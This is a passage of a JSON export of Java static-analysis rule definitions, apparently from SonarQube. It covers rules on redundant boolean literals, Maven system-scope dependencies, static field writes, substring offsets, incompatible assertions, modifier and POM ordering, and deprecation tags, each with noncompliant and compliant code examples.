            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": true,
            "tags": [],
            "sysTags": [
                "denial-of-service"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "factoryMethod",
                    "htmlDesc": "the fully-qualified name of a factory method that returns an open resource, with or without a parameter list. E.G. &quot;org.assoc.res.ResourceFactory$Innerclass#create&quot; or &quot;org.assoc.res.SpecialResourceFactory#create(java.lang.String, int)&quot;",
                    "type": "STRING"
                },
                {
                    "key": "closingMethod",
                    "htmlDesc": "the fully-qualified name of the method which closes the open resource, with or without a parameter list. E.G. &quot;org.assoc.res.MyResource#closeMe&quot; or &quot;org.assoc.res.MySpecialResource#closeMe(java.lang.String, int)&quot;",
                    "type": "STRING"
                },
                {
                    "key": "constructor",
                    "htmlDesc": "the fully-qualified name of a constructor that creates an open resource. An optional signature may be specified after the class name. E.G. &quot;org.assoc.res.MyResource&quot; or &quot;org.assoc.res.MySpecialResource(java.lang.String, int)&quot;",
                    "type": "STRING"
                },
                {
                    "key": "openingMethod",
                    "htmlDesc": "the fully-qualified name of a method that opens an existing resource, with or without a parameter list. E.G. &quot;org.assoc.res.ResourceFactory#create&quot; or &quot;org.assoc.res.SpecialResourceFactory #create(java.lang.String, int)&quot;",
                    "type": "STRING"
                }
            ],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1125",
            "repo": "java",
            "name": "Boolean literals should not be redundant",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Redundant Boolean literals should be removed from expressions to improve readability.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (booleanMethod() == true) { /* ... */ }\nif (booleanMethod() == false) { /* ... */ }\nif (booleanMethod() || false) { /* ... */ }\ndoSomething(!false);\ndoSomething(booleanMethod() == true);\n\nbooleanVariable = booleanMethod() ? true : false;\nbooleanVariable = booleanMethod() ? true : exp;\nbooleanVariable = booleanMethod() ? false : exp;\nbooleanVariable = booleanMethod() ? exp : true;\nbooleanVariable = booleanMethod() ? exp : false;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (booleanMethod()) { /* ... */ }\nif (!booleanMethod()) { /* ... */ }\nif (booleanMethod()) { /* ... */ }\ndoSomething(true);\ndoSomething(booleanMethod());\n\nbooleanVariable = booleanMethod();\nbooleanVariable = booleanMethod() || exp;\nbooleanVariable = !booleanMethod() &amp;&amp; exp;\nbooleanVariable = !booleanMethod() || exp;\nbooleanVariable = booleanMethod() &amp;&amp; exp;\n</pre>",
            "mdDesc": "<p>Redundant Boolean literals should be removed from expressions to improve readability.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (booleanMethod() == true) { /* ... */ }\nif (booleanMethod() == false) { /* ... */ }\nif (booleanMethod() || false) { /* ... */ }\ndoSomething(!false);\ndoSomething(booleanMethod() == true);\n\nbooleanVariable = booleanMethod() ? true : false;\nbooleanVariable = booleanMethod() ? true : exp;\nbooleanVariable = booleanMethod() ? false : exp;\nbooleanVariable = booleanMethod() ? exp : true;\nbooleanVariable = booleanMethod() ? exp : false;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (booleanMethod()) { /* ... */ }\nif (!booleanMethod()) { /* ... */ }\nif (booleanMethod()) { /* ... */ }\ndoSomething(true);\ndoSomething(booleanMethod());\n\nbooleanVariable = booleanMethod();\nbooleanVariable = booleanMethod() || exp;\nbooleanVariable = !booleanMethod() &amp;&amp; exp;\nbooleanVariable = !booleanMethod() || exp;\nbooleanVariable = booleanMethod() &amp;&amp; exp;\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3422",
            "repo": "java",
            "name": "Dependencies should not have \"system\" scope",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>system</code> dependencies are sought at a specific, specified path. This drastically reduces portability because if you deploy your artifact\nin an environment that's not configured just like yours is, your code won't work. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n&lt;dependency&gt;\n  &lt;groupId&gt;javax.sql&lt;/groupId&gt;\n  &lt;artifactId&gt;jdbc-stdext&lt;/artifactId&gt;\n  &lt;version&gt;2.0&lt;/version&gt;\n  &lt;scope&gt;system&lt;/scope&gt;  &lt;!-- Noncompliant --&gt;\n  &lt;systemPath&gt;/usr/bin/lib/rt.jar&lt;/systemPath&gt;  &lt;!-- remove this --&gt;\n&lt;/dependency&gt;\n</pre>",
            "mdDesc": "<p><code>system</code> dependencies are sought at a specific, specified path. This drastically reduces portability because if you deploy your artifact\nin an environment that's not configured just like yours is, your code won't work. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n&lt;dependency&gt;\n  &lt;groupId&gt;javax.sql&lt;/groupId&gt;\n  &lt;artifactId&gt;jdbc-stdext&lt;/artifactId&gt;\n  &lt;version&gt;2.0&lt;/version&gt;\n  &lt;scope&gt;system&lt;/scope&gt;  &lt;!-- Noncompliant --&gt;\n  &lt;systemPath&gt;/usr/bin/lib/rt.jar&lt;/systemPath&gt;  &lt;!-- remove this --&gt;\n&lt;/dependency&gt;\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "lock-in",
                "maven"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2696",
            "repo": "java",
            "name": "Instance methods should not write to \"static\" fields",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Correctly updating a <code>static</code> field from a non-static method is tricky to get right and could easily lead to bugs if there are multiple\nclass instances and/or multiple threads in play. Ideally, <code>static</code> fields are only updated from <code>synchronized static</code>\nmethods.</p>\n<p>This rule raises an issue each time a <code>static</code> field is updated from a non-static method.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n\n  private static int count = 0;\n\n  public void doSomething() {\n    //...\n    count++;  // Noncompliant\n  }\n}\n</pre>",
            "mdDesc": "<p>Correctly updating a <code>static</code> field from a non-static method is tricky to get right and could easily lead to bugs if there are multiple\nclass instances and/or multiple threads in play. Ideally, <code>static</code> fields are only updated from <code>synchronized static</code>\nmethods.</p>\n<p>This rule raises an issue each time a <code>static</code> field is updated from a non-static method.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n\n  private static int count = 0;\n\n  public void doSomething() {\n    //...\n    count++;  // Noncompliant\n  }\n}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "multi-threading"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4635",
            "repo": "java",
            "name": "String offset-based methods should be preferred for finding substrings from offsets",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Looking for a given substring starting from a specified offset can be achieved by such code: <code>str.substring(beginIndex).indexOf(char1)</code>.\nThis works well, but it creates a new <code>String</code> for each call to the <code>substring</code> method. When this is done in a loop, a lot of\n<code>Strings</code> are created for nothing, which can lead to performance problems if <code>str</code> is large.</p>\n<p>To avoid performance problems, <code>String.substring(beginIndex)</code> should not be chained with the following methods:</p>\n<ul>\n  <li> <code>indexOf(int ch)</code> </li>\n  <li> <code>indexOf(String str)</code> </li>\n  <li> <code>lastIndexOf(int ch)</code> </li>\n  <li> <code>lastIndexOf(String str)</code> </li>\n  <li> <code>startsWith(String prefix)</code> </li>\n</ul>\n<p>For each of these methods, another method with an additional parameter is available to specify an offset.</p>\n<p>Using these methods gives the same result while avoiding the creation of additional <code>String</code> instances.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nstr.substring(beginIndex).indexOf(char1); // Noncompliant; a new String is going to be created by \"substring\"\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nstr.indexOf(char1, beginIndex);\n</pre>",
            "mdDesc": "<p>Looking for a given substring starting from a specified offset can be achieved by such code: <code>str.substring(beginIndex).indexOf(char1)</code>.\nThis works well, but it creates a new <code>String</code> for each call to the <code>substring</code> method. When this is done in a loop, a lot of\n<code>Strings</code> are created for nothing, which can lead to performance problems if <code>str</code> is large.</p>\n<p>To avoid performance problems, <code>String.substring(beginIndex)</code> should not be chained with the following methods:</p>\n<ul>\n  <li> <code>indexOf(int ch)</code> </li>\n  <li> <code>indexOf(String str)</code> </li>\n  <li> <code>lastIndexOf(int ch)</code> </li>\n  <li> <code>lastIndexOf(String str)</code> </li>\n  <li> <code>startsWith(String prefix)</code> </li>\n</ul>\n<p>For each of these methods, another method with an additional parameter is available to specify an offset.</p>\n<p>Using these methods gives the same result while avoiding the creation of additional <code>String</code> instances.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nstr.substring(beginIndex).indexOf(char1); // Noncompliant; a new String is going to be created by \"substring\"\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nstr.indexOf(char1, beginIndex);\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5845",
            "repo": "java",
            "name": "Assertions comparing incompatible types should not be made",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Assertions comparing incompatible types always fail, and negative assertions always pass. At best, negative assertions are useless. At worst, the\ndeveloper loses time trying to fix his code logic before noticing wrong assertions.</p>\n<p>Dissimilar types are:</p>\n<ul>\n  <li> comparing a primitive with null </li>\n  <li> comparing an object with an unrelated primitive (E.G. a string with an int) </li>\n  <li> comparing unrelated classes </li>\n  <li> comparing an array to a non-array </li>\n  <li> comparing two arrays of dissimilar types </li>\n</ul>\n<p>This rule also raises issues for unrelated <code>class</code> and <code>interface</code> or unrelated <code>interface</code> types in negative\nassertions. Because except in some corner cases, those types are more likely to be dissimilar. And inside a negative assertion, there is no test\nfailure to inform the developer about this unusual comparison.</p>\n<p>Supported test frameworks:</p>\n<ul>\n  <li> JUnit4 </li>\n  <li> JUnit5 </li>\n  <li> AssertJ </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\ninterface KitchenTool {}\ninterface Plant {}\nclass Spatula implements KitchenTool {}\nclass Tree implements Plant {}\n\nvoid assertValues(int size,\n                  Spatula spatula, KitchenTool tool,  KitchenTool[] tools,\n                  Tree    tree,    Plant       plant, Tree[]        trees) {\n\n  // Whatever the given values, those negative assertions will always pass due to dissimilar types:\n  assertThat(size).isNotNull();           // Noncompliant; primitives can not be null\n  assertThat(spatula).isNotEqualTo(tree); // Noncompliant; unrelated classes\n  assertThat(tool).isNotSameAs(tools);    // Noncompliant; array &amp; non-array\n  assertThat(trees).isNotEqualTo(tools);  // Noncompliant; incompatible arrays\n\n  // Those assertions will always fail\n  assertThat(size).isNull();                       // Noncompliant\n  assertThat(spatula).isEqualTo(tree);             // Noncompliant\n\n  // Those negative assertions are more likely to always pass\n  assertThat(spatula).isNotEqualTo(plant); // Noncompliant; unrelated class and interface\n  assertThat(tool).isNotEqualTo(plant);    // Noncompliant; unrelated interfaces\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href='/coding_rules#rule_key=java%3AS2159'>S2159</a> - Silly equality checks should not be made </li>\n</ul>",
            "mdDesc": "<p>Assertions comparing incompatible types always fail, and negative assertions always pass. At best, negative assertions are useless. At worst, the\ndeveloper loses time trying to fix his code logic before noticing wrong assertions.</p>\n<p>Dissimilar types are:</p>\n<ul>\n  <li> comparing a primitive with null </li>\n  <li> comparing an object with an unrelated primitive (E.G. a string with an int) </li>\n  <li> comparing unrelated classes </li>\n  <li> comparing an array to a non-array </li>\n  <li> comparing two arrays of dissimilar types </li>\n</ul>\n<p>This rule also raises issues for unrelated <code>class</code> and <code>interface</code> or unrelated <code>interface</code> types in negative\nassertions. Because except in some corner cases, those types are more likely to be dissimilar. And inside a negative assertion, there is no test\nfailure to inform the developer about this unusual comparison.</p>\n<p>Supported test frameworks:</p>\n<ul>\n  <li> JUnit4 </li>\n  <li> JUnit5 </li>\n  <li> AssertJ </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\ninterface KitchenTool {}\ninterface Plant {}\nclass Spatula implements KitchenTool {}\nclass Tree implements Plant {}\n\nvoid assertValues(int size,\n                  Spatula spatula, KitchenTool tool,  KitchenTool[] tools,\n                  Tree    tree,    Plant       plant, Tree[]        trees) {\n\n  // Whatever the given values, those negative assertions will always pass due to dissimilar types:\n  assertThat(size).isNotNull();           // Noncompliant; primitives can not be null\n  assertThat(spatula).isNotEqualTo(tree); // Noncompliant; unrelated classes\n  assertThat(tool).isNotSameAs(tools);    // Noncompliant; array &amp; non-array\n  assertThat(trees).isNotEqualTo(tools);  // Noncompliant; incompatible arrays\n\n  // Those assertions will always fail\n  assertThat(size).isNull();                       // Noncompliant\n  assertThat(spatula).isEqualTo(tree);             // Noncompliant\n\n  // Those negative assertions are more likely to always pass\n  assertThat(spatula).isNotEqualTo(plant); // Noncompliant; unrelated class and interface\n  assertThat(tool).isNotEqualTo(plant);    // Noncompliant; unrelated interfaces\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> {rule:java:S2159} - Silly equality checks should not be made </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1124",
            "repo": "java",
            "name": "Modifiers should be declared in the correct order",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The Java Language Specification recommends listing modifiers in the following order:</p>\n<p>1. Annotations</p>\n<p>2. public</p>\n<p>3. protected</p>\n<p>4. private</p>\n<p>5. abstract</p>\n<p>6. static</p>\n<p>7. final</p>\n<p>8. transient</p>\n<p>9. volatile</p>\n<p>10. synchronized</p>\n<p>11. native</p>\n<p>12. strictfp</p>\n<p>Not following this convention has no technical impact, but will reduce the code's readability because most developers are used to the standard\norder.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nstatic public void main(String[] args) {   // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic static void main(String[] args) {   // Compliant\n}\n</pre>",
            "mdDesc": "<p>The Java Language Specification recommends listing modifiers in the following order:</p>\n<p>1. Annotations</p>\n<p>2. public</p>\n<p>3. protected</p>\n<p>4. private</p>\n<p>5. abstract</p>\n<p>6. static</p>\n<p>7. final</p>\n<p>8. transient</p>\n<p>9. volatile</p>\n<p>10. synchronized</p>\n<p>11. native</p>\n<p>12. strictfp</p>\n<p>Not following this convention has no technical impact, but will reduce the code's readability because most developers are used to the standard\norder.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nstatic public void main(String[] args) {   // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic static void main(String[] args) {   // Compliant\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2333",
            "repo": "java",
            "name": "Redundant modifiers should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The methods declared in an <code>interface</code> are <code>public</code> and <code>abstract</code> by default. Any variables are automatically\n<code>public static final</code>. Finally, <code>class</code> and <code>interface</code> are automatically <code>public static</code>. There is no\nneed to explicitly declare them so.</p>\n<p>Since annotations are implicitly interfaces, the same holds true for them as well.</p>\n<p>Similarly, the <code>final</code> modifier is redundant on any method of a <code>final</code> class, <code>private</code> is redundant on the\nconstructor of an <code>Enum</code>, and <code>static</code> is redundant for <code>interface</code> nested into a <code>class</code> or\n<code>enum</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic interface Vehicle {\n\n  public void go(int speed, Direction direction);  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic interface Vehicle {\n\n  void go(int speed, Direction direction);\n</pre>",
            "mdDesc": "<p>The methods declared in an <code>interface</code> are <code>public</code> and <code>abstract</code> by default. Any variables are automatically\n<code>public static final</code>. Finally, <code>class</code> and <code>interface</code> are automatically <code>public static</code>. There is no\nneed to explicitly declare them so.</p>\n<p>Since annotations are implicitly interfaces, the same holds true for them as well.</p>\n<p>Similarly, the <code>final</code> modifier is redundant on any method of a <code>final</code> class, <code>private</code> is redundant on the\nconstructor of an <code>Enum</code>, and <code>static</code> is redundant for <code>interface</code> nested into a <code>class</code> or\n<code>enum</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic interface Vehicle {\n\n  public void go(int speed, Direction direction);  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic interface Vehicle {\n\n  void go(int speed, Direction direction);\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy",
                "finding"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1123",
            "repo": "java",
            "name": "Deprecated elements should have both the annotation and the Javadoc tag",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Deprecation should be marked with both the <code>@Deprecated</code> annotation and @deprecated Javadoc tag. The annotation enables tools such as\nIDEs to warn about referencing deprecated elements, and the tag can be used to explain when it was deprecated, why, and how references should be\nrefactored. </p>\n<p>Further, Java 9 adds two additional arguments to the annotation:</p>\n<ul>\n  <li> <code>since</code> allows you to describe when the deprecation took place </li>\n  <li> <code>forRemoval</code>, indicates whether the deprecated element will be removed at some future date </li>\n</ul>\n<p>If your compile level is Java 9 or higher, you should be using one or both of these arguments.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass {\n\n  @Deprecated\n  public void foo1() {\n  }\n\n  /**\n    * @deprecated\n    */\n  public void foo2() {    // Noncompliant\n  }\n\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass {\n\n  /**\n    * @deprecated (when, why, refactoring advice...)\n    */\n  @Deprecated\n  public void foo1() {\n  }\n\n  /**\n    * Java &gt;= 9\n    * @deprecated (when, why, refactoring advice...)\n    */\n  @Deprecated(since=\"5.1\")\n  public void foo2() {\n  }\n\n  /**\n    * Java &gt;= 9\n    * @deprecated (when, why, refactoring advice...)\n    */\n  @Deprecated(since=\"4.2\", forRemoval=true)\n  public void foo3() {\n  }\n\n}\n</pre>\n<h2>Exceptions</h2>\n<p>The members and methods of a deprecated class or interface are ignored by this rule. The classes and interfaces themselves are still subject to\nit.</p>\n<pre>\n/**\n * @deprecated (when, why, etc...)\n */\n@Deprecated\nclass Qix  {\n\n  public void foo() {} // Compliant; class is deprecated\n\n}\n\n/**\n * @deprecated (when, why, etc...)\n */\n@Deprecated\ninterface Plop {\n\n  void bar();\n\n}\n</pre>",
            "mdDesc": "<p>Deprecation should be marked with both the <code>@Deprecated</code> annotation and @deprecated Javadoc tag. The annotation enables tools such as\nIDEs to warn about referencing deprecated elements, and the tag can be used to explain when it was deprecated, why, and how references should be\nrefactored. </p>\n<p>Further, Java 9 adds two additional arguments to the annotation:</p>\n<ul>\n  <li> <code>since</code> allows you to describe when the deprecation took place </li>\n  <li> <code>forRemoval</code>, indicates whether the deprecated element will be removed at some future date </li>\n</ul>\n<p>If your compile level is Java 9 or higher, you should be using one or both of these arguments.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyClass {\n\n  @Deprecated\n  public void foo1() {\n  }\n\n  /**\n    * @deprecated\n    */\n  public void foo2() {    // Noncompliant\n  }\n\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass MyClass {\n\n  /**\n    * @deprecated (when, why, refactoring advice...)\n    */\n  @Deprecated\n  public void foo1() {\n  }\n\n  /**\n    * Java &gt;= 9\n    * @deprecated (when, why, refactoring advice...)\n    */\n  @Deprecated(since=\"5.1\")\n  public void foo2() {\n  }\n\n  /**\n    * Java &gt;= 9\n    * @deprecated (when, why, refactoring advice...)\n    */\n  @Deprecated(since=\"4.2\", forRemoval=true)\n  public void foo3() {\n  }\n\n}\n</pre>\n<h2>Exceptions</h2>\n<p>The members and methods of a deprecated class or interface are ignored by this rule. The classes and interfaces themselves are still subject to\nit.</p>\n<pre>\n/**\n * @deprecated (when, why, etc...)\n */\n@Deprecated\nclass Qix  {\n\n  public void foo() {} // Compliant; class is deprecated\n\n}\n\n/**\n * @deprecated (when, why, etc...)\n */\n@Deprecated\ninterface Plop {\n\n  void bar();\n\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "bad-practice",
                "obsolete"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3423",
            "repo": "java",
            "name": "pom elements should be in the recommended order",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The POM Code Convention is the Maven project's internal recommendation for POM element ordering. It calls for listing modifiers in the following\norder:</p>\n<ol>\n  <li> &lt;modelVersion/&gt; </li>\n  <li> &lt;parent/&gt; </li>\n  <li> &lt;groupId/&gt; </li>\n  <li> &lt;artifactId/&gt; </li>\n  <li> &lt;version/&gt; </li>\n  <li> &lt;packaging/&gt; </li>\n  <li> &lt;name/&gt; </li>\n  <li> &lt;description/&gt; </li>\n  <li> &lt;url/&gt; </li>\n  <li> &lt;inceptionYear/&gt; </li>\n  <li> &lt;organization/&gt; </li>\n  <li> &lt;licenses/&gt; </li>\n  <li> &lt;developers/&gt; </li>\n  <li> &lt;contributors/&gt; </li>\n  <li> &lt;mailingLists/&gt; </li>\n  <li> &lt;prerequisites/&gt; </li>\n  <li> &lt;modules/&gt; </li>\n  <li> &lt;scm/&gt; </li>\n  <li> &lt;issueManagement/&gt; </li>\n  <li> &lt;ciManagement/&gt; </li>\n  <li> &lt;distributionManagement/&gt; </li>\n  <li> &lt;properties/&gt; </li>\n  <li> &lt;dependencyManagement/&gt; </li>\n  <li> &lt;dependencies/&gt; </li>\n  <li> &lt;repositories/&gt; </li>\n  <li> &lt;pluginRepositories/&gt; </li>\n  <li> &lt;build/&gt; </li>\n  <li> &lt;reporting/&gt; </li>\n  <li> &lt;profiles/&gt; </li>\n</ol>\n<p>Not following this convention has no technical impact, but will reduce the pom's readability because most developers are used to the standard\norder.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://maven.apache.org/developers/conventions/code.html#POM_Code_Convention\">POM Code Convention</a> </li>\n</ul>",
            "mdDesc": "<p>The POM Code Convention is the Maven project's internal recommendation for POM element ordering. It calls for listing modifiers in the following\norder:</p>\n<ol>\n  <li> &lt;modelVersion/&gt; </li>\n  <li> &lt;parent/&gt; </li>\n  <li> &lt;groupId/&gt; </li>\n  <li> &lt;artifactId/&gt; </li>\n  <li> &lt;version/&gt; </li>\n  <li> &lt;packaging/&gt; </li>\n  <li> &lt;name/&gt; </li>\n  <li> &lt;description/&gt; </li>\n  <li> &lt;url/&gt; </li>\n  <li> &lt;inceptionYear/&gt; </li>\n  <li> &lt;organization/&gt; </li>\n  <li> &lt;licenses/&gt; </li>\n  <li> &lt;developers/&gt; </li>\n  <li> &lt;contributors/&gt; </li>\n  <li> &lt;mailingLists/&gt; </li>\n  <li> &lt;prerequisites/&gt; </li>\n  <li> &lt;modules/&gt; </li>\n  <li> &lt;scm/&gt; </li>\n  <li> &lt;issueManagement/&gt; </li>\n  <li> &lt;ciManagement/&gt; </li>\n  <li> &lt;distributionManagement/&gt; </li>\n  <li> &lt;properties/&gt; </li>\n  <li> &lt;dependencyManagement/&gt; </li>\n  <li> &lt;dependencies/&gt; </li>\n  <li> &lt;repositories/&gt; </li>\n  <li> &lt;pluginRepositories/&gt; </li>\n  <li> &lt;build/&gt; </li>\n  <li> &lt;reporting/&gt; </li>\n  <li> &lt;profiles/&gt; </li>\n</ol>\n<p>Not following this convention has no technical impact, but will reduce the pom's readability because most developers are used to the standard\norder.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://maven.apache.org/developers/conventions/code.html#POM_Code_Convention\">POM Code Convention</a> </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention",
                "maven"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1244",
            "repo": "java",
            "name": "Floating point numbers should not be tested for equality",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Floating point math is imprecise because of the challenges of storing such values in a binary representation. Even worse, floating point math is\nnot associative; push a <code>float</code> or a <code>double</code> through a series of simple mathematical operations and the answer will be\ndifferent based on the order of those operation because of the rounding that takes place at each step.</p>\n<p>Even simple floating point assignments are not simple:</p>\n<pre>\nfloat f = 0.1; // 0.100000001490116119384765625\ndouble d = 0.1; // 0.1000000000000000055511151231257827021181583404541015625\n</pre>\n<p>(Results will vary based on compiler and compiler settings);</p>\n<p>Therefore, the use of the equality (<code>==</code>) and inequality (<code>!=</code>) operators on <code>float</code> or <code>double</code> values\nis almost always an error. Instead the best course is to avoid floating point comparisons altogether. When that is not possible, you should consider\nusing one of Java's float-handling <code>Numbers</code> such as <code>BigDecimal</code> which can properly handle floating point comparisons. A third\noption is to look not for equality but for whether the value is close enough. I.e. compare the absolute value of the difference between the 